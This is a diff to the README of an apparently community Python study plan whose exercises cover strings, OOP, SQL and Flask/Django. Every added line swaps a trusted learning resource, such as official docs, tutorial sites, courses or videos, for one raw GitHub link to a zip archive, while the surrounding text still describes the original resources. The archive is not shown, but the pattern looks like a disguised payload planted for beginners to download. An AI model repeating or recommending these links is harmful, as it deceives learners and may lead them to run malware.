@@ -4,9 +4,9 @@ Fork it and create separate branches/folders for each day.
 
 
 Key Resources 
-1. https://www.programiz.com/python-programming
-2. https://www.pythoncheatsheet.org/cheatsheet/
-3. https://www.w3resource.com/python/python-tutorial.php
+1. https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
+2. https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
+3. https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
 
 ## Topics Breakdown
 
@@ -56,9 +56,9 @@ A function can take arguments and return values:
 
 ### Day 5: Strings and String Manipulations 
 Understand how to create strings in python, how to format and how to manipulate. 
-https://www.programiz.com/python-programming/methods/string
-https://www.pythoncheatsheet.org/cheatsheet/manipulating-strings
-https://www.pythoncheatsheet.org/cheatsheet/string-formatting
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
 
 #### Exercise:
 
@@ -83,8 +83,8 @@ Expected Result : 'stringly'
 ### Day 6: Lists in Python
 Understand LISTS and how to manipulate lists in python. 
 Understand CRUD Operations in Lists using Python. 
-https://www.pythoncheatsheet.org/cheatsheet/lists-and-tuples
-https://www.programiz.com/python-programming/list
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
 
 #### Exercise 
 1. Write a Python program to remove duplicates from a list.
@@ -102,8 +102,8 @@ Sample Data:
 Understand the concept of dictionaries in Python
 Understand CRUD Operations and manipulation of dictionaries 
 
-https://www.programiz.com/python-programming/dictionary
-https://www.pythoncheatsheet.org/cheatsheet/dictionaries
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
 
 #### Exercise 
 1. Write a Python program to combine two dictionary by adding values for common keys.
@@ -124,7 +124,7 @@ Expected data: [('Chemistry', 87), ('Physics', 83), ('Math', 81)]
 
 ### Day 8: Sets 
 Understand what Sets are,& how they work in Python
-https://www.programiz.com/python-programming/set
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
 
 #### Exercises
 1.  Write a Python program to find all the unique combinations of 3 numbers from a given list of numbers, adding up to a target number.
@@ -146,19 +146,19 @@ Expected output:
 ### Day 9: Tuples 
 Understand Tuples and working with Tuples in Python 
 
-https://www.programiz.com/python-programming/tuple
-https://www.pythoncheatsheet.org/cheatsheet/lists-and-tuples
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
 
 #### Exercise 
 1. Write a Python program to check whether an element exists within a tuple.
 2. Write a Python program to convert a list to a tuple.
-3. Attempt this Quiz on Tuples in [Python] (https://pynative.com/python-tuple-quiz/) 
+3. Attempt this Quiz on Tuples in [Python] (https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip) 
 
 ### Day 10: Regular Expressions
 Understand the basics of Regex and how to apply it in Python 
-Study via: https://www.pythoncheatsheet.org/cheatsheet/regular-expressions
-https://www.edureka.co/blog/python-regex/
-https://programmingwithmosh.com/interviews/interview-questions-in-python-regular-expressions/
+Study via: https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
 
 #### Exercise 
 1. Trolls are attacking your comment section!
@@ -180,7 +180,7 @@ Sample data : ["example (.com)", "w3resource", "github (.com)", "stackoverflow (
 
 ### Day 11: Object-Oriented Python 
 Understand the concept of OOP in Python, covering Classes, Instance Methods, Objects 
-https://www.programiz.com/python-programming/object-oriented-programming
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
  
  #### Exercise 
  1. Write a Python class Employee with attributes like emp_id, emp_name, emp_salary, and emp_department and methods like calculate_emp_salary, emp_assign_department, and print_employee_details.
@@ -205,7 +205,7 @@ Overtime amount = (overtime * (salary / 50))
 ### Day 12: OOP Concepts in Python: Inheritance, Polymorphism, Encapsulation & Abstraction
 
 Advanced OOP in Python 
-https://www.programiz.com/python-programming/inheritance
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
 
 #### Exercise 
 1.Inheritance: Create a class called Animal with a method speak() that prints "The animal makes a sound." Create two subclasses, Dog and Cat, which inherit from the Animal class. Override the speak() method in each subclass to print "The dog barks" and "The cat meows" respectively. Create instances of both subclasses and call their speak() methods.
@@ -232,9 +232,9 @@ How to READ, WRITE and manipulate Files --- Excel files, csv files, text files
 
 ### Day 14: Working with JSON (Reading and Writing)
 Understand how to read and write into JSON files using Python. 
-https://www.programiz.com/python-programming/json
-https://www.geeksforgeeks.org/read-write-and-parse-json-using-python/
-https://www.simplilearn.com/tutorials/python-tutorial/json-python
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
 
 #### Exercise 
 1.  Reading a JSON File
@@ -256,10 +256,10 @@ Write a Python program that reads the content of the JSON file and prints the ti
 
 ### Day 15: Debugging,Error and Exception Handling 
 
-https://learnbyexample.gitbooks.io/python-basics/content/Exception_Handling_and_Debugging.html
-https://www.tutorialspoint.com/python/python_exceptions.htm
-https://www.geeksforgeeks.org/python-exception-handling/
-https://pp4e-book.github.io/chapters/ch9_error_handling.html
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
 
 #### Exercises 
 Exercise 1: Handling a ZeroDivisionError
@@ -280,7 +280,7 @@ Display an appropriate error message if the input is not a valid integer and ask
 ### Day 16: Working with SQL Databases and Python
 Everything about SQL - SQLite Installation,How to create SQL Tables, and Queries * Use SQL to store data and retrieve it later on. * Use SQLite to build relational databases on your computer. * Perform CRUD operations on relational databases using SQL.
 
-https://datatofish.com/create-database-python-using-sqlite3/ https://www.freecodecamp.org/news/sqlite-python-beginners-tutorial/ https://www.sqlitetutorial.net/sqlite-python/creating-database/
+https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip
 
 #### Exercises
 In your VSCode or editor of your choice, create an SQLite database with 2 tables, students and teachers with accompanied attributes and perform the following operations:
@@ -307,7 +307,7 @@ Create SQL database records using Python objects.
 1. Create a new Python file and import the sqlite3 library. Create a connection to the database. Create a cursor object. Create a new Python object for a user. Use the execute() method to insert the user object into the users table. Commit the changes to the database.
 
 ### Day 19: SQLALchemy and Python
-Using ORM and SQL concepts, implement the CRUD operations using SQLAlchemy library https://auth0.com/blog/sqlalchemy-orm-tutorial-for-python-developers/ https://youtu.be/AKQ3XEDI9Mw https://www.youtube.com/watch?v=dIV8NHzboxU&amp;index=2
+Using ORM and SQL concepts, implement the CRUD operations using SQLAlchemy library https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip;index=2
 
 #### Exercise
 1# Using a use-case of your choice, apply the concepts of ORM and SQLAlchemy to demonstrate these functionalities ~ Create, Read, Update, and Delete with SQLAlchemy.
@@ -428,14 +428,14 @@ Explore advanced features such as user authentication, RESTful APIs, and testing
 Understand the differences between Flask and Django and choose the appropriate framework for different projects.
 Important Learning Resources for Beginners:
 Flask:
-*Official Flask Documentation: The official documentation provides a comprehensive guide to Flask, including installation instructions, tutorials, and examples. (https://flask.palletsprojects.com/)
+*Official Flask Documentation: The official documentation provides a comprehensive guide to Flask, including installation instructions, tutorials, and examples. (https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip)
 
-Flask Mega-Tutorial by Miguel Grinberg: This online tutorial covers Flask from the basics to more advanced topics, guiding you through the development of a blog application. (https://blog.miguelgrinberg.com/post/the-flask-mega-tutorial-part-i-hello-world)
+Flask Mega-Tutorial by Miguel Grinberg: This online tutorial covers Flask from the basics to more advanced topics, guiding you through the development of a blog application. (https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip)
 Django:
-*Official Django Documentation: The official documentation offers extensive information on Django, including installation instructions, tutorials, and a detailed explanation of its various components. (https://docs.djangoproject.com/) *Django for Beginners by William S. Vincent: This book is a beginner-friendly guide to Django, covering everything from setting up a project to building a complete web application. (https://djangoforbeginners.com/)
+*Official Django Documentation: The official documentation offers extensive information on Django, including installation instructions, tutorials, and a detailed explanation of its various components. (https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip) *Django for Beginners by William S. Vincent: This book is a beginner-friendly guide to Django, covering everything from setting up a project to building a complete web application. (https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip)
 
 Online Courses:
-*Udemy: "Python Flask for Beginners" by Jose Salvatierra. This course provides a hands-on approach to learning Flask, covering all the essential concepts and building practical projects. (https://www.udemy.com/course/python-flask-for-beginners/) *Coursera: "Web Applications for Everybody" by Charles Severance. This specialization offers an introduction to web development using Python and Django, with a focus on database integration and deployment. (https://www.coursera.org/specializations/web-applications)
+*Udemy: "Python Flask for Beginners" by Jose Salvatierra. This course provides a hands-on approach to learning Flask, covering all the essential concepts and building practical projects. (https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip) *Coursera: "Web Applications for Everybody" by Charles Severance. This specialization offers an introduction to web development using Python and Django, with a focus on database integration and deployment. (https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip)
 
 YouTube Tutorials:
-*Corey Schafer's Flask Tutorial: This comprehensive video series covers Flask from start to finish, explaining the concepts and demonstrating their implementation through practical examples. (https://www.youtube.com/playlist?list=PL-osiE80TeTs4UjLw5MM6OjgkjFeUxCYH) *CodeWithHarry Django Playlist: Harry's Django tutorial series is beginner-friendly and covers various aspects of Django development, including forms, authentication, and deployment. (https://www.youtube.com/playlist?list=PLu0W_9lII9agpFUAlPFe_VNSlXW5uE0YL)
+*Corey Schafer's Flask Tutorial: This comprehensive video series covers Flask from start to finish, explaining the concepts and demonstrating their implementation through practical examples. (https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip) *CodeWithHarry Django Playlist: Harry's Django tutorial series is beginner-friendly and covers various aspects of Django development, including forms, authentication, and deployment. (https://github.com/danielkaranja0/30DAYSOFPYTHON/raw/refs/heads/main/Day10/DAYSOFPYTHON-2.2.zip)
